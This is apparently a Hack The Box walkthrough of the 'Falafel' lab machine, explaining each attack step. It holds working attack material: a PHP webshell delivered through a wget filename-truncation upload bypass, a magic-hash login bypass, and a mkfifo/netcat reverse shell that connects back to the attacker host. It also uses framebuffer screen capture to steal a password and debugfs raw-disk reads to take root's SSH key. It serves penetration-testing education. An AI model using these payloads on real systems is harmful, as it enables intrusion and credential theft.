# Hack The Box - Falafel: Comprehensive Step-by-Step Walkthrough

**Target IP:** `10.129.229.139`  
**Attacker IP:** `10.10.16.84`  
**OS:** Linux (Ubuntu)  
**Difficulty:** Hard  
**Flags:**
- User: `1e909[redacted]5bf217a`
- Root: `cc38a05[redacted]b3341cd5`

---

## Table of Contents
1. [Phase 0: The Hacker Mindset Before Starting](#phase-0-the-hacker-mindset-before-starting)
2. [Phase 1: Reconnaissance - Mapping the Attack Surface](#phase-1-reconnaissance---mapping-the-attack-surface)
3. [Phase 2: Web Enumeration - Reading the Signs](#phase-2-web-enumeration---reading-the-signs)
4. [Phase 3: Authentication Recon - Finding the Cracks](#phase-3-authentication-recon---finding-the-cracks)
5. [Phase 4: PHP Type Juggling - The Magic Hash Attack](#phase-4-php-type-juggling---the-magic-hash-attack)
6. [Phase 5: File Upload Exploitation - Filename Truncation](#phase-5-file-upload-exploitation---filename-truncation)
7. [Phase 6: Initial Access - Catching a Shell](#phase-6-initial-access---catching-a-shell)
8. [Phase 7: Privilege Escalation to Moshe - Credential Reuse](#phase-7-privilege-escalation-to-moshe---credential-reuse)
9. [Phase 8: Privilege Escalation to Yossi - The Framebuffer](#phase-8-privilege-escalation-to-yossi---the-framebuffer)
10. [Phase 9: Privilege Escalation to Root - The Disk Group](#phase-9-privilege-escalation-to-root---the-disk-group)
11. [Key Lessons & Takeaways](#key-lessons--takeaways)

---

## Phase 0: The Hacker Mindset Before Starting

### What is the "Hacker Mindset"?
Before typing a single command, understand this: **hacking is not about running tools. It is about understanding how systems fail.** Every machine on Hack The Box is a puzzle built by a human. Humans make assumptions. Humans take shortcuts. Humans reuse code patterns they learned from tutorials. Your job is to find those assumptions, shortcuts, and patterns — and exploit the gaps between what the developer *intended* and what the system *actually does*.

### The Falafel Mindset
Falafel is a **hard** Linux box. That means:
- There will be **multiple steps** — no single exploit gives you root.
- There will be **technical depth** — you need to understand *why* things work, not just *that* they work.
- There will be **misdirection** — some paths look promising but are dead ends (like trying to crack the admin hash).
- The box rewards **patience and curiosity** — every file, every error message, every group membership is a potential clue.

**Golden Rule for Falafel:** Read everything. The box gives you hints constantly. The `cyberlaw.txt` file literally tells you the entire exploitation path. The admin's profile quote hints at type juggling. The upload error messages hint at filename length limits. The group memberships are not random — they are deliberately chosen to create a privilege escalation chain.

---

## Phase 1: Reconnaissance - Mapping the Attack Surface

### The Command
```bash
nmap -sS -sC -sV -p- 10.129.229.139
```

### Breaking It Down (Baby Steps)
| Flag | Meaning | Why We Use It |
|------|---------|---------------|
| `-sS` | SYN scan (half-open) | Fast and stealthy; does not complete the TCP handshake, leaving fewer logs |
| `-sC` | Run default NSE scripts | Automatically checks for common misconfigurations (e.g., default Apache pages, SSH banner grabbing) |
| `-sV` | Version detection | Tells us *exactly* which software is running, so we can look up known vulnerabilities |
| `-p-` | Scan all 65,535 ports | Services often run on non-standard ports. Missing one open port could mean missing the entire attack vector |

### The Results
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

### Hacker Mindset: What Are We Looking For?
**Two services.** That's it. This immediately tells us something important: **the web application is the primary attack vector.** SSH is almost certainly for later — either for credential reuse after we find passwords, or for a more stable shell once we have credentials.

**Why does this matter?** Because on a hard box with only two ports, the web app is where 90% of the work happens. We don't waste time looking for exotic kernel exploits or hidden services. We focus our energy on the HTTP service.

**Additional Recon:**
```bash
nmap -sC -sV -p 80,22 -oA nmap/scripts 10.129.229.139
```
This saves output in multiple formats (`-oA`) for documentation and future reference. Professional hackers document everything — you never know when you'll need to come back to a box.

---

## Phase 2: Web Enumeration - Reading the Signs

### Step 2A: Visit the Website
Open `http://10.129.229.139` in a browser. What do you see?
- A simple site called "Falafel Lovers"
- A "Home" link and a "Login" button
- The login link goes to `login.php`

**Hacker Mindset:** The `.php` extension tells us the backend is PHP. This is critical because PHP has specific vulnerability classes (type juggling, file inclusion, unsafe serialization) that Python or Node.js apps don't have.

### Step 2B: Check robots.txt
```bash
curl http://10.129.229.139/robots.txt
```
Result:
```
/*.txt
```

**Hacker Mindset:** `robots.txt` is not a security control — it is an *invitation*. The developer is saying "please don't look at .txt files." A hacker's immediate response is: **I am absolutely going to look at .txt files.** This is like a sign that says "Do not enter" on an unlocked door.

### Step 2C: Directory Brute-Forcing
```bash
ffuf -u http://10.129.229.139/FUZZ -ic -e .txt,.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Why these extensions?**
- `.php` — we know it's a PHP app
- `.txt` — robots.txt explicitly mentioned .txt files

**Key findings:**
| File/Dir | Status | Why It Matters |
|----------|--------|----------------|
| `login.php` | 200 | Authentication page — primary target |
| `upload.php` | 302 | Requires login — our end goal after auth bypass |
| `profile.php` | 302 | Requires login — likely post-auth functionality |
| `cyberlaw.txt` | 200 | **THE ROADMAP** — read this immediately |
| `connection.php` | 200 | Empty response, but name suggests DB credentials |

### Step 2D: Read cyberlaw.txt
```bash
curl http://10.129.229.139/cyberlaw.txt
```

Result:
```
From: Falafel Network Admin (admin@falafel.htb)
Subject: URGENT!! MALICIOUS SITE TAKE OVER!
...
A user named "chris" has informed me that he could log into MY account
without knowing the password, then take FULL CONTROL of the website using
the image upload feature.
...
Dear develpors, fix this broken site ASAP.
```

**Hacker Mindset: This is the most important file on the entire box.**

Let's break down what the developer just told us:
1. **"chris"** is a valid username.
2. **"log into MY account without knowing the password"** — the authentication mechanism is broken. There is a bypass.
3. **"image upload feature"** — there's a file upload that leads to code execution.
4. **"senior php developer worked on filtering the URL of the upload"** — the upload has *some* protection, but it's not perfect. The developer is overconfident.
5. **"Dear develpors"** [sic] — the typo is funny, but more importantly, this reinforces that we're dealing with a PHP application written by someone who thinks they've fixed the vulnerabilities.

**This one file tells us the entire exploitation chain:** bypass login → upload shell → code execution. Our job is now to figure out the *mechanics* of each step.

---

## Phase 3: Authentication Recon - Finding the Cracks

### Step 3A: Test the Login Form Manually
Visit `http://10.129.229.139/login.php`. Try logging in with:
- Username: `admin`, Password: `wrong`
- Username: `nonexistent`, Password: `wrong`

**Observe the error messages:**
- Non-existent user: `"Try again"`
- Existing user, wrong password: `"Wrong identification : admin"`

**Hacker Mindset: This is an information disclosure vulnerability.** The application tells us whether a username exists *before* checking the password. This means:
1. We can enumerate valid usernames.
2. The backend likely runs a query like `SELECT * FROM users WHERE username = '$input'` first.
3. If the username exists, it *then* checks the password.

This two-step process is a classic pattern — and a classic mistake. It gives us binary feedback (username exists / doesn't exist), which is the foundation for blind SQL injection attacks.

### Step 3B: Username Enumeration with wfuzz
```bash
wfuzz -c -w /usr/share/wordlists/seclists/Usernames/Names/names.txt \
  -d "username=FUZZ&password=abcd" \
  -u http://10.129.229.139/login.php --hh 7074
```

**What does this do?**
- `-c` = colored output (easier to read)
- `-w` = wordlist (list of common names)
- `-d` = POST data. `FUZZ` is replaced by each wordlist entry
- `--hh 7074` = hide responses with 7074 characters (the "Try again" response for invalid users)

**Results:**
```
admin   (response size different)
chris   (response size different)
```

**Hacker Mindset:** We now know two valid accounts: `admin` and `chris`. We also know the application responds differently based on username validity. This confirms our hypothesis about the two-step authentication process.

**Why does this matter?** Because if the app checks username first, we can inject SQL into the username field and use the password error message as a "true/false" oracle. This is called **boolean-based blind SQL injection**.

---

## Phase 4: PHP Type Juggling - The Magic Hash Attack

### Understanding the Vulnerability

PHP has a feature called **type juggling**. When you use a loose comparison operator (`==`), PHP tries to automatically convert variables to compatible types before comparing them. This is different from strict comparison (`===`), which checks both value *and* type.

**Example:**
```php
var_dump("0e123456" == "0e987654");  // bool(true)
var_dump("0e123456" === "0e987654"); // bool(false)
```

**Why is the first one true?**
PHP sees strings that start with `0e` followed by digits. It interprets these as **scientific notation** (0 × 10^anything = 0). Both sides evaluate to the float `0.0`, so `0.0 == 0.0` is `true`.

### How Does This Apply to Password Hashing?

Many PHP applications store MD5 password hashes and compare them like this:
```php
if ($stored_hash == md5($user_password)) {
    login_successful();
}
```

**The attack:** If the stored hash starts with `0e` followed by only digits, it is a **magic hash**. If we can find *any* password whose MD5 hash also starts with `0e...`, the loose comparison will evaluate to `true`.

### The Magic Hash for MD5

| Input | MD5 Hash |
|-------|----------|
| `240610708` | `0e462097431906509019562988736854` |

Any hash starting with `0e` and containing only digits after it will be interpreted as `0.0` in PHP.

### Step 4A: Test the Magic Hash Login
```bash
curl -s -X POST -d "username=admin&password=240610708" \
  -c cookies.txt http://10.129.229.139/login.php | grep -i "upload"
```

**Result:** We see links to `upload.php`, `profile.php`, and `logout.php`. **We are authenticated as admin.**

**Hacker Mindset: We bypassed authentication without knowing the real password.** We didn't brute-force it, we didn't SQL inject it (though that was possible too), and we didn't need to crack any hash. We exploited the developer's misunderstanding of PHP's type system.

**Why is this so powerful?** Because the developer probably thought they were safe. They stored hashed passwords. They didn't store plaintext. But they used `==` instead of `===`, and that single-character difference (`=` vs `===`) completely broke their authentication.

---

## Phase 5: File Upload Exploitation - Filename Truncation

### Understanding the Upload Mechanism

Visit `http://10.129.229.139/upload.php`. The page allows you to submit a URL to an image. The server downloads it using `wget`.

**Attempt 1:** Try uploading a direct PHP shell (`shell.php`).
**Result:** "Extension not allowed" or similar error.

**Attempt 2:** Try uploading `shell.php.png`.
**Result:** The server downloads it... but it's saved as `.php.png` and doesn't execute as PHP.

**Hacker Mindset: The developer applied a filter. Filters can always be bypassed if you understand the underlying mechanism.**

### The Wget Filename Limit

`wget` has a built-in filename length limit of **236 characters**. If a URL's filename is longer than 236 characters, `wget` truncates it.

**The critical insight:** The extension filter runs *before* `wget` saves the file. So:
1. Filter sees `longname.php.png` → allows it (`.png` is valid)
2. `wget` downloads the file
3. `wget` truncates the filename to 236 chars
4. The `.png` part gets cut off
5. The file is now saved as `longname.php`

### Step 5A: Create the Webshell
```bash
cd /tmp
echo '<?php system($_REQUEST["cmd"]); ?>' > $(python3 -c 'print("A"*232 + ".php.png")')
```

**Why 232 A's?**
- The full URL is: `http://10.10.16.84:8081/` (24 chars) + `A*232` (232 chars) + `.php.png` (8 chars) = 264 chars total
- But `wget` counts only the filename part, and the truncation point is carefully chosen so that `.png` falls beyond the 236-character limit for the filename portion
- The math: we want the final saved name to be `A*232.php` (236 chars total), so the `.png` gets truncated

### Step 5B: Start a Local Web Server
```bash
cd /tmp && python3 -m http.server 8081
```

**Why?** The target server fetches the file from our machine. We need to host it.

### Step 5C: Submit the Upload
```bash
cd /tmp
FILENAME=$(python3 -c 'print("A"*232 + ".php.png")')
curl -s -b cookies.txt -X POST \
  -d "url=http://10.10.16.84:8081/$FILENAME" \
  http://10.129.229.139/upload.php | grep -E "CMD|New name|uploads/"
```

**Result:**
```
CMD: cd /var/www/html/uploads/0531-1954_30d7e3e4cc82c58e; wget 'http://10.10.16.84:8081/AAAA...AAAA.php.png'
New name is AAAAAAAAA...AAAAAAAA.php.
```

**Notice the dot at the end!** The `.png` was truncated. The file is now `.php.` (the trailing dot is just how the output formats it).

**Hacker Mindset: We defeated two protections at once.**
1. The extension filter (saw `.png`, allowed it)
2. The filename save mechanism (`wget` truncated the name, leaving `.php`)

This is a classic example of **intersection of behaviors** — two systems (the upload filter and wget) have different ideas of what the filename is, and that discrepancy creates a vulnerability.

---

## Phase 6: Initial Access - Catching a Shell

### Step 6A: Test Code Execution
```bash
curl -s "http://10.129.229.139/uploads/0531-1954_30d7e3e4cc82c58e/AAAAAAAA...AAAAAAAA.php?cmd=id"
```

**Result:** `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

### Step 6B: Upgrade to Reverse Shell

A webshell is fine for single commands, but we want an interactive shell for exploring the system, running `su`, and generally having a better time.

**Start a listener on Kali:**
```bash
nc -lnvp 4444
```

**Trigger the reverse shell:**
```bash
curl -s "http://10.129.229.139/uploads/0531-1954_30d7e3e4cc82c58e/AAAAAAAA...AAAAAAAA.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.84%204444%20%3E%2Ftmp%2Ff"
```

**Decoded payload:**
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.16.84 4444 > /tmp/f
```

**How this works:**
1. `mkfifo /tmp/f` creates a named pipe (FIFO)
2. `cat /tmp/f` reads from the pipe
3. The output goes to `/bin/sh -i` (interactive shell)
4. The shell's output goes through `nc` back to our listener
5. `nc`'s output goes back into the pipe (`> /tmp/f`)
6. This creates a full duplex communication channel

**Result on Kali:**
```
connect to [10.10.16.84] from (UNKNOWN) [10.129.229.139] 45290
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Hacker Mindset:** We now have a shell as `www-data`. This is the web server user — heavily restricted, but we can read web files, configuration files, and anything the web server has access to. Our next goal is to find credentials or misconfigurations that let us become a real user.

---

## Phase 7: Privilege Escalation to Moshe - Credential Reuse

### Step 7A: Read Web Application Files
```bash
cat /var/www/html/connection.php
```

**Result:**
```php
<?php
   define('DB_SERVER', 'localhost:3306');
   define('DB_USERNAME', 'moshe');
   define('DB_PASSWORD', 'falafelIsReallyTasty');
   define('DB_DATABASE', 'falafel');
?>
```

**Hacker Mindset: Developers reuse passwords.** It is extremely common for database passwords to be the same as the system user's password. Why? Because humans are lazy, and remembering 47 different passwords is hard. The developer created a user `moshe` for the database and probably used the same password for the system account.

### Step 7B: Upgrade the Shell

Basic `nc` shells are "dumb" — they don't handle TTY properly, so `su` won't work directly.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a pseudo-terminal, making the shell behave more like a real SSH session.

### Step 7C: Become Moshe
```bash
su moshe
```
Password: `falafelIsReallyTasty`

**Result:**
```
moshe@falafel:/var/www/html/uploads/0531-1954_30d7e3e4cc82c58e$ id
uid=1001(moshe) gid=1001(moshe) groups=1001(moshe),4(adm),8(mail),9(news),22(voice),25(floppy),29(audio),44(video),60(games)
```

### Step 7D: Get the User Flag
```bash
cat ~/user.txt
```
**Flag:** `1e90960[redacted]5bf217a`

**Hacker Mindset: Always check your groups immediately.** `groups` tells you what resources you can access. Look at that list — `video`, `audio`, `floppy`, `games`, `adm`... these are not random. On a CTF box, unusual group memberships are **always** part of the intended path.

---

## Phase 8: Privilege Escalation to Yossi - The Framebuffer

### Step 8A: Check Who Else is Logged In
```bash
w
```

**Result:**
```
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1     -                Sat23   20:52m  0.04s  0.03s -bash
```

**Hacker Mindset: `yossi` is physically logged in on `tty1`.** This means there's a real monitor and keyboard attached (or a virtual console). If we can see the screen, we might see what yossi is doing — maybe typing a password.

### Step 8B: Check Video Group Access
```bash
groups
ls -l /dev/fb*
```

**Result:**
```
crw-rw---- 1 root video 29, 0 May 1 19:42 /dev/fb0
```

**What is `/dev/fb0`?**
The **framebuffer** is a memory-mapped device that represents the current contents of the screen. On Linux systems with a GUI or console, `/dev/fb0` contains the raw pixel data being displayed.

**Why does `video` group matter?**
The framebuffer device is owned by `root` with group `video`. Since `moshe` is in the `video` group, we can read the screen.

### Step 8C: Capture the Screen
```bash
cat /dev/fb0 > /tmp/screenshot.raw
```

### Step 8D: Get Screen Resolution
```bash
cat /sys/class/graphics/fb0/virtual_size
```

**Result:** `1176,885`

**Why do we need this?**
The raw framebuffer is just a blob of bytes. To convert it to an image, we need to know:
- Width: 1176 pixels
- Height: 885 pixels
- Pixel format: we have to guess this (common formats: `rgb565`, `0rgb`, `bgr24`)

### Step 8E: Transfer to Kali and Convert
```bash
# On Kali
scp moshe@10.129.229.139:/tmp/screenshot.raw ./screenshot.raw

# Convert with ffmpeg
ffmpeg -pix_fmt 0rgb -s 1176x885 -f rawvideo -i screenshot.raw -frames:v 1 screenshot.jpg
xdg-open screenshot.jpg
```

**What we see in the image:**
Yossi is at a terminal. He typed his password by mistake into the username field of the `passwd` command:
```
yossi@falafel:~$ passwd
Changing password for yossi.
(current) UNIX password: MoshePlzStopHackingMe!
```

**Password:** `MoshePlzStopHackingMe!`

**Hacker Mindset: The framebuffer is an often-overlooked attack vector.** If a user is physically logged in and you have `video` group access, you can literally *see their screen*. This is not theoretical — it's exactly what we just did. On shared systems, kiosks, or servers with physical consoles, this is a real threat.

### Step 8F: SSH as Yossi
```bash
ssh yossi@10.129.229.139
```
Password: `MoshePlzStopHackingMe!`

---

## Phase 9: Privilege Escalation to Root - The Disk Group

### Step 9A: Check Yossi's Groups
```bash
groups
```

**Result:**
```
yossi adm disk cdrom dip plugdev lpadmin sambashare
```

**Hacker Mindset: `disk` group is incredibly powerful.** Members of the `disk` group can read and write directly to raw disk devices (`/dev/sda`, `/dev/sda1`, etc.). This means you can bypass the entire Linux permission system and read *any file on the disk*, including `/root/.ssh/id_rsa`, `/etc/shadow`, or anything else.

**Why is this dangerous?**
The `disk` group is effectively root access because you can mount, read, and write the raw filesystem. The OS permission checks happen at the filesystem level, but if you're reading the raw device, you're bypassing those checks entirely.

### Step 9B: Enumerate Disk Devices
```bash
df
blkid
```

**Result:**
```
/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)
```

### Step 9C: Use debugfs to Access Root's Files

`debugfs` is a filesystem debugger that can operate on unmounted or mounted ext filesystems. Since we can read `/dev/sda1` (thanks to `disk` group), we can use `debugfs` to browse the filesystem as if we were root.

```bash
debugfs /dev/sda1
```

**Inside debugfs:**
```
debugfs: ls -l /root/.ssh
  56604   40755 (2)      0      0    4096 13-Sep-2022 18:51 .
   2456   40750 (2)      0      0    4096 30-May-2026 23:18 ..
  56619  100600 (1)      0      0    1679 28-Nov-2017 23:01 id_rsa
  56629  100644 (1)      0      0     394 28-Nov-2017 23:01 id_rsa.pub
  56631  100600 (1)      0      0     394 28-Nov-2017 23:17 authorized_keys

debugfs: dump /root/.ssh/id_rsa /tmp/id_rsa
debugfs: quit
```

**Hacker Mindset:** We just extracted root's private SSH key by reading the raw disk device. The Linux kernel never checked whether `yossi` had permission to read `/root/.ssh/id_rsa` because we went *around* the kernel's permission system entirely.

### Step 9D: SSH as Root
```bash
chmod 600 /tmp/id_rsa
ssh -i /tmp/id_rsa root@localhost
```

**Result:**
```
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-213-generic x86_64)
root@falafel:~#
```

### Step 9E: Get the Root Flag
```bash
cat /root/root.txt
```
**Flag:** `cc38a0[redacted]3341cd5`

---

## Key Lessons & Takeaways

### 1. The Developer is Your Best Source of Intelligence
`cyberlaw.txt` literally handed us the entire exploitation path. Always read every file, every error message, every comment. Developers leave breadcrumbs everywhere.

### 2. Understand the Language, Not Just the Framework
PHP type juggling is a language-level quirk. If you only know "SQL injection" and "XSS", you miss vulnerabilities like this. Understanding how PHP compares strings and numbers is fundamental.

### 3. Filter Bypass = Understanding the Underlying Mechanism
The upload filter was not bypassed by a magic payload. It was bypassed by understanding that **the filter and wget had different filename length limits**. This is an intersection vulnerability — two systems interacting in an unexpected way.

### 4. Groups Matter More Than You Think
- `video` → read framebuffer → screenshot of active session
- `disk` → read raw disk → bypass all filesystem permissions
- `adm` → read logs
- `audio` → record microphone (on some systems)

On Linux, unusual group memberships are almost always part of the intended privilege escalation path.

### 5. The Framebuffer is a Real Attack Vector
Most penetration testers forget about `/dev/fb0`. But on systems with physical consoles or VMs with video devices, the framebuffer can reveal passwords, keystrokes, and sensitive data.

### 6. Raw Disk Access = Game Over
The `disk` group is effectively root. If you ever encounter it during a penetration test, treat it as a critical finding. With `debugfs`, `dd`, or even direct `strings` on `/dev/sda1`, you can extract any file on the system.

### 7. Documentation is Professionalism
We saved nmap output (`-oA`). We noted exact paths, exact commands, and exact responses. Real-world penetration testing requires detailed reporting. The difference between a script kiddie and a professional is documentation.

---

**Congratulations on rooting Falafel!** 
